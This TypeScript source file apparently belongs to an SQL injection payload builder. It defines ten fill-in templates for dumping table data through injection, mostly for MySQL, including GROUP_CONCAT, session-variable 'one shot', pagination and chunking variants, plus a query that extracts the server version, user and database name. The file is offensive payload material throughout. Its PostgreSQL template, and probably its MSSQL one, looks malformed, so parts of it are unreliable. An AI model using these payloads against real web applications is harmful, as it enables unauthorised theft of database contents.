import { BuilderSubcategory, TemplateConfig } from '../../types';

const standardDataParameters = [
  {
    id: 'database',
    label: 'Database',
    defaultValue: 'database()',
    inputType: 'text' as const
  },
  {
    id: 'table_name',
    label: 'Table name',
    defaultValue: 'table_name',
    inputType: 'text' as const
  },
  {
    id: 'column_name',
    label: 'Column name',
    defaultValue: 'column_1,0x3a,column_2,0x3a,column_3',
    inputType: 'text' as const
  }
];

export const dataTemplates: TemplateConfig[] = [
  {
    id: 'data-group-concat',
    name: 'group_concat()',
    description: 'Data group_concat extraction template with HTML break separator',
    content: '(SELECT+GROUP_CONCAT(column_1,0x3a,column_2,0x3a,column_3+SEPARATOR+0x3c62723e)+FROM+TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'data-one-shot',
    name: 'one shot (Variable Loop)',
    description: 'Data one shot extraction template using session variable accumulator',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(TABLE_NAME)WHERE(@x)IN(@x:=CONCAT(0x20,@x,column_1,0x3a,column_2,0x3a,column_3,0x3c62723e))))x)',
    parameters: standardDataParameters
  },
  {
    id: 'data-second-shot',
    name: 'second shot',
    description: 'Data second shot extraction template',
    content: '(SELECT+GROUP_CONCAT(0x3c62723e,column_1,column_2,column_3)+FROM (TABLE_NAME))',
    parameters: standardDataParameters
  },
  {
    id: 'data-third-shot',
    name: 'third shot',
    description: 'Data third shot extraction template with header server info',
    content: 'concat(0x4e747442656c6c203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(TABLE_NAME)WHERE(@x)IN(@x:=CONCAT(0x20,@x,column_1,column_2,column_3,0x3c62723e))))x))',
    parameters: standardDataParameters
  },
  {
    id: 'data-concat-ws',
    name: 'concat_ws() in group_concat',
    description: 'Clean data extraction using unified concat_ws separator',
    content: '(SELECT+GROUP_CONCAT(CONCAT_WS(0x3a,column_1,0x3a,column_2,0x3a,column_3)+SEPARATOR+0x3c62723e)+FROM+TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'data-pagination-limit',
    name: 'Row-by-Row Pagination (LIMIT 0,1)',
    description: 'Extracts table data row-by-row; prevents 1024 group_concat truncations',
    content: '(SELECT+CONCAT_WS(0x3a,column_1,0x3a,column_2,0x3a,column_3)+FROM+TABLE_NAME+LIMIT+0,1)',
    parameters: standardDataParameters
  },
  {
    id: 'data-mid-chunk',
    name: 'Chunk Extraction (MID / SUBSTR)',
    description: 'Extracts data in chunks when web page restricts displayed character count',
    content: '(SELECT+MID(GROUP_CONCAT(column_1,0x3a,column_2,0x3a,column_3),1,100)+FROM+TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'data-json-arrayagg',
    name: 'JSON_ARRAYAGG() (MySQL 5.7+ / 8.0+)',
    description: 'Modern JSON array data dumping format',
    content: '(SELECT+JSON_ARRAYAGG(JSON_OBJECT(0x64,column_1,0x3a,column_2,0x3a,column_3))+FROM+TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'data-postgre-string-agg',
    name: 'PostgreSQL STRING_AGG Data Dump',
    description: 'Data dumping query for PostgreSQL database targets',
    content: '(SELECT+STRING_AGG(column_1,0x3a,column_2,0x3a,column_3,0x3c62723e)+FROM+TABLE_NAME)',
    parameters: standardDataParameters
  },
  {
    id: 'data-mssql-xml-path',
    name: 'MSSQL FOR XML PATH Data Dump',
    description: 'Data dumping query for Microsoft SQL Server database targets',
    content: '(SELECT+column_1,0x3a,column_2,0x3a,column_3+0x3c62723e+FROM+TABLE_NAME+FOR+XML+PATH(0x2727))',
    parameters: standardDataParameters
  }
];

export const dataSubcategory: BuilderSubcategory = {
  id: 'data',
  label: 'Data',
  description: 'Data extraction query templates (GROUP_CONCAT, One-Shot, CONCAT_WS, LIMIT, MID, JSON, PG/MSSQL)',
  templates: dataTemplates
};
